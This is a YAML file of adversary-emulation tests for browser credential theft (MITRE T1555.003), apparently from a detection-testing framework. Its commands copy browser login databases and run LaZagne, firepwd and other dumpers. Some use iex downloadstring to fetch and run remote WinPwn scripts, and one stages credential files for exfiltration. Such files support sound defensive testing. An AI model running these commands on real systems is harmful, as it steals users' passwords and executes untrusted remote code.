@@ -1,0 +1,413 @@
+attack_technique: T1555.003
+display_name: "Credentials from Password Stores: Credentials from Web Browsers"
+atomic_tests:
+- name: Run Chrome-password Collector
+  auto_generated_guid: 8c05b133-d438-47ca-a630-19cc464c4622
+  description: |
+    A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.
+
+    Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will be a file modification of $env:TEMP\sysinternals\passwordsdb.
+
+    Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: File path for modified Sysinternals
+      type: String
+      default: $env:TEMP
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Modified Sysinternals must be located at #{file_path}
+    prereq_command: |
+      if (Test-Path #{file_path}\SysInternals) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
+      Expand-Archive #{file_path}\Modified-SysInternalsSuite.zip #{file_path}\sysinternals -Force
+      Remove-Item #{file_path}\Modified-SysInternalsSuite.zip -Force
+  executor:
+    command: |
+      Set-Location -path "#{file_path}\Sysinternals";
+      ./accesschk.exe -accepteula .;
+    cleanup_command: |
+      Remove-Item #{file_path}\Sysinternals -Force -Recurse -ErrorAction Ignore
+    name: powershell
+- name: Search macOS Safari Cookies
+  auto_generated_guid: c1402f7b-67ca-43a8-b5f3-3143abedc01b
+  description: |
+    This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.
+
+    Upon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.
+  supported_platforms:
+  - macos
+  input_arguments:
+    search_string:
+      description: String to search Safari cookies to find.
+      type: String
+      default: coinbase
+  executor:
+    command: |
+      cd ~/Library/Cookies
+      grep -q "#{search_string}" "Cookies.binarycookies"
+    name: sh
+- name: LaZagne - Credentials from Browser
+  auto_generated_guid: 9a2915b3-3954-4cce-8c76-00fbf4dbd014
+  description: |
+    The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.
+    LaZagne is an open source application used to retrieve passwords stored on a local computer. 
+  supported_platforms:
+    - windows
+  input_arguments:
+    lazagne_path:
+      description: Path to LaZagne
+      type: Path
+      default: PathToAtomicsFolder\T1555.003\bin\LaZagne.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      LaZagne.exe must exist on disk at specified location (#{lazagne_path})
+    prereq_command: |
+      if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{lazagne_path}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "#{lazagne_path}"
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      #{lazagne_path} browsers
+- name: Simulating access to Chrome Login Data
+  auto_generated_guid: 3d111226-d09a-4911-8715-fe11664f960d
+  description: |
+    Simulates an adversary accessing encrypted credentials from Google Chrome Login database. 
+  supported_platforms:
+    - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Chrome must be installed
+    prereq_command: 'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}'
+    get_prereq_command: | 
+      $installer = "$env:temp\ChromeStandaloneSetup64.msi"
+      Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.msi https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
+      msiexec /i $installer /qn
+      Start-Process -FilePath "chrome.exe"
+      Stop-Process -Name "chrome"
+  executor:
+    name: powershell
+    command: |
+      Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination $env:temp
+      Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination $env:temp
+    cleanup_command: |
+      Remove-Item -Path "$env:temp\Login Data" -Force -ErrorAction Ignore
+      Remove-Item -Path "$env:temp\Login Data For Account" -Force -ErrorAction Ignore
+- name: Simulating access to Opera Login Data
+  auto_generated_guid: 28498c17-57e4-495a-b0be-cc1e36de408b
+  description: |
+    Simulates an adversary accessing encrypted credentials from Opera web browser's login database. 
+  supported_platforms:
+    - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Opera must be installed
+    prereq_command: 'if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe") -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program Files (x86)\Opera\launcher.exe"))) {exit 0} else {exit 1}'      
+    get_prereq_command: | 
+      $installer = "$env:temp\OperaStandaloneInstaller.exe"
+      Invoke-WebRequest -OutFile $env:temp\OperaStandaloneInstaller.exe https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe
+      Start-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
+      Start-Sleep -s 180
+      Stop-Process -Name "opera"
+  - description: |
+      Opera login data file must exist
+    prereq_command: 'if (Test-Path "$env:APPDATA\Opera Software\Opera Stable\Login Data") {exit 0} else {exit 1}'    
+    get_prereq_command: | 
+      New-Item -Path "$env:APPDATA\Opera Software\Opera Stable\Login Data" -ItemType File
+  executor:
+    name: powershell
+    command: |
+      Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination $env:temp
+    cleanup_command: |
+      Remove-Item -Path "$env:temp\Login Data" -Force -ErrorAction Ignore
+- name: Simulating access to Windows Firefox Login Data
+  auto_generated_guid: eb8da98a-2e16-4551-b3dd-83de49baa14c
+  description: |
+    Simulates an adversary accessing encrypted credentials from firefox web browser's login database.
+    more info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data
+  supported_platforms:
+    - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Firefox must be installed
+    prereq_command: 'if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe") -Or (Test-Path "C:\Program Files (x86)\Mozilla Firefox\firefox.exe")) {exit 0} else {exit 1}'      
+    get_prereq_command: |
+      if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"}else {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US"}
+      $installer = "$env:temp\firefoxsetup.exe"
+      (New-Object Net.WebClient).DownloadFile($url,$installer)
+      Start-Process $installer -ArgumentList '/S' -Wait
+  - description: |
+      Firefox login data file must exist
+    prereq_command: 'if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\") {exit 0} else {exit 1}'    
+    get_prereq_command: | 
+      if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox="C:\Program Files\Mozilla Firefox\firefox.exe"}else {$firefox="C:\Program Files (x86)\Mozilla Firefox\firefox.exe"}
+      Start-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait
+      Start-Process $firefox -NoNewWindow
+      Start-Sleep -s 20
+      Stop-Process -Name firefox
+  executor:
+    name: powershell
+    command: |
+      Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination $env:temp -Force -Recurse
+    cleanup_command: |
+      Remove-Item -Path "$env:temp\Profiles" -Force -ErrorAction Ignore -Recurse
+- name: Simulating access to Windows Edge Login Data
+  auto_generated_guid: a6a5ec26-a2d1-4109-9d35-58b867689329
+  description: |
+    Simulates an adversary accessing encrypted credentials from Edge web browser's login database.
+    more info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/
+  supported_platforms:
+    - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Edge must be installed
+    prereq_command: 'if (Test-Path "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe") {exit 0} else {exit 1}'      
+    get_prereq_command: |
+      "Installation is not implemented as Edge is a part of windows"
+  - description: |
+      Edge login data file must exist
+    prereq_command: 'if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default") {exit 0} else {exit 1}'    
+    get_prereq_command: | 
+      $edge="C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+      Start-Process $edge 
+      Start-Sleep -s 20
+      Stop-Process -Name msedge
+  executor:
+    name: powershell
+    command: |
+      Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination $env:temp\Edge -Force -Recurse
+    cleanup_command: |
+      Remove-Item -Path "$env:temp\Edge" -Force -ErrorAction Ignore -Recurse
+- name: Decrypt Mozilla Passwords with Firepwd.py
+  auto_generated_guid: dc9cd677-c70f-4df5-bd1c-f114af3c2381
+  description: |
+    Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.
+    Upon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. 
+  supported_platforms:
+    - windows
+  input_arguments:
+    Firepwd_Path:
+      description: Filepath for Firepwd.py
+      type: String
+      default: $env:temp\Firepwd.py
+    Out_Filepath:
+      description: Filepath to output results to
+      type: String
+      default: $env:temp\T1555.003Test8.txt
+    VS_CMD_Path:
+      description: Filepath to Visual Studio Build Tools Command prompt
+      type: String
+      default: C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat
+    Python_Path:
+      description: Filepath to python
+      type: String
+      default: C:\Program Files\Python310\python.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Firepwd must exist at #{Firepwd_Path}
+    prereq_command: |
+      if (Test-Path "#{Firepwd_Path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}"
+  - description: |
+      Firefox profile directory must be present
+    prereq_command: |
+      if (get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\" -erroraction silentlycontinue) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "$env:temp\firefox.msi"
+      msiexec.exe /i "$env:temp\firefox.msi" /quiet
+      sleep -s 30
+      start-process "$env:programfiles\Mozilla Firefox\firefox.exe".
+      sleep -s 5
+      stop-process -name "firefox"
+  - description: |
+      Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}
+    prereq_command: |
+      if (Test-Path "#{VS_CMD_Path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://aka.ms/vs/17/release/vs_BuildTools.exe" -outfile "$env:temp\VS_BuildTools.exe"
+      write-host "Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from $env:temp\VS_BuildTools.exe."
+  - description: |
+      Python must be installed
+    prereq_command: |
+      if (Test-Path "#{Python_Path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "$env:temp\python_setup.exe"
+      Start-Process -FilePath $env:TEMP\python_setup.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
+  - description: |
+      Pip must be installed.
+    prereq_command: |
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (pip -v) {exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://bootstrap.pypa.io/ez_setup.py" -outfile "$env:temp\ez_setup.py"      
+      invoke-webrequest "https://bootstrap.pypa.io/get-pip.py" -outfile "$env:temp\get-pip.py"
+      cmd /c "$env:temp\ez_setup.py"
+      cmd /c "$env:temp\get-pip.py"
+  - description: |
+      Pycryptodome library must be installed 
+    prereq_command: |
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (pip show pycryptodome) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (test-path "#{VS_CMD_Path}"){pip install pycryptodome | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq"}
+  - description: |
+      Pyasn1 library must be installed 
+    prereq_command: |
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (pip show pyasn1) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (test-path "#{VS_CMD_Path}"){pip install pyasn1 | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq."}
+  executor:
+    name: powershell
+    command: |
+     $PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
+     cmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
+     cat #{Out_Filepath}
+    cleanup_command: |
+     Remove-Item -Path "#{Out_Filepath}" -erroraction silentlycontinue   
+- name: LaZagne.py - Dump Credentials from Firefox Browser
+  auto_generated_guid: 87e88698-621b-4c45-8a89-4eaebdeaabb1
+  description: Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne
+  supported_platforms:
+  - linux
+  input_arguments:
+    lazagne_path:
+      description: Path you put LaZagne Github with LaZagne.py
+      type: String
+      default: /tmp/LaZagne/Linux
+    specific_module:
+      description: You may change the module to "all" for all password that can be found by LaZagne.py
+      type: string
+      default: 'browsers -firefox'
+    output_file:
+      description: This is where output for the Firefox passwords goes
+      type: String
+      default: /tmp/firefox_password.txt
+  dependency_executor_name: sh
+  dependencies:
+  - description: Get Lazagne from Github and install requirements
+    prereq_command: 'test -f #{lazagne_path}/laZagne.py'
+    get_prereq_command: cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt
+  - description: Needs git, python3 and some pip stuff
+    prereq_command: which git && which python3 && which pip
+    get_prereq_command: apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
+  executor:
+    command: 'python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}'
+    cleanup_command: 'rm -R /tmp/LaZagne; rm -f #{output_file}'
+    name: sh
+    elevation_required: true
+- name: Stage Popular Credential Files for Exfiltration
+  auto_generated_guid: f543635c-1705-42c3-b180-efd6dc6e7ee7
+  description: |
+    This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,
+    simulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). 
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell 
+    command: |
+     $exfil_folder = "$env:temp\T1555.003"
+     if (test-path "$exfil_folder") {} else {new-item -path "$env:temp" -Name "T1555.003" -ItemType "directory" -force}
+     $FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
+     if (test-path "$FirefoxCredsLocation\key4.db") {copy-item "$FirefoxCredsLocation\key4.db" -destination "$exfil_folder\T1555.003Firefox_key4.db"} else {}
+     if (test-path "$FirefoxCredsLocation\logins.json") {copy-item "$FirefoxCredsLocation\logins.json" -destination "$exfil_folder\T1555.003Firefox_logins.json"} else {}
+     if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -destination "$exfil_folder\T1555.003Chrome_Login Data"} else {}
+     if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account" -destination "$exfil_folder\T1555.003Chrome_Login Data For Account"} else {}
+     if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item "$env:appdata\Opera Software\Opera Stable\Login Data" -destination "$exfil_folder\T1555.003Opera_Login Data"} else {}
+     if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$exfil_folder\T1555.003Edge_Login Data"} else {} 
+     compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -force
+    cleanup_command: |
+     Remove-Item -Path "$env:temp\T1555.003.zip" -force -erroraction silentlycontinue   
+     Remove-Item -Path "$env:temp\T1555.003\" -force -recurse -erroraction silentlycontinue
+- name: WinPwn - BrowserPwn
+  auto_generated_guid: 764ea176-fb71-494c-90ea-72e9d85dce76
+  description: Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      browserpwn -consoleoutput -noninteractive
+    cleanup_command: |-
+      rm .\System.Data.SQLite.dll -ErrorAction Ignore
+    name: powershell
+- name: WinPwn - Loot local Credentials - mimi-kittenz
+  auto_generated_guid: ec1d0b37-f659-4186-869f-31a554891611
+  description: Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      kittenz -consoleoutput -noninteractive
+    name: powershell
+- name: WinPwn - PowerSharpPack - Sharpweb for Browser Credentials 
+  auto_generated_guid: e5e3d639-6ea8-4408-9ecd-d5a286268ca0
+  description: PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
+      Invoke-Sharpweb -command "all"
+    name: powershell
+- name: Simulating Access to Chrome Login Data - MacOS
+  auto_generated_guid: 124e13e5-d8a1-4378-a6ee-a53cd0c7e369
+  description: |
+    This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. 
+    Once the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. 
+    See https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . 
+  supported_platforms:
+  - macos
+  executor:
+    command: |
+      cp ~/Library/"Application Support/Google/Chrome/Default/Login Data" "/tmp/T1555.003_Login Data"
+      cp ~/Library/"Application Support/Google/Chrome/Default/Login Data For Account" "/tmp/T1555.003_Login Data For Account"
+    cleanup_command: |
+      rm "/tmp/T1555.003_Login Data" >/dev/null 2>&1
+      rm "/tmp/T1555.003_Login Data For Account" >/dev/null 2>&1
+    name: sh
+- name: WebBrowserPassView - Credentials from Browser
+  description: |-
+    The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.
+  supported_platforms:
+  - windows
+  input_arguments:
+    webbrowserpassview_path:
+      description: 'Path to the WebBrowserPassView executable '
+      type: String
+      default: PathToAtomicsFolder\T1555.003\bin\WebBrowserPassView.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if WebBrowserPassView.exe exists in the specified path #{webbrowserpassview_path}
+    prereq_command: |
+      if (Test-Path #{webbrowserpassview_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile #{webbrowserpassview_path}
+  executor:
+    command: |
+      Start-Process #{webbrowserpassview_path}
+      Start-Sleep -Second 4
+      Stop-Process -Name "WebBrowserPassView"
+    name: powershell
+    elevation_required: true 
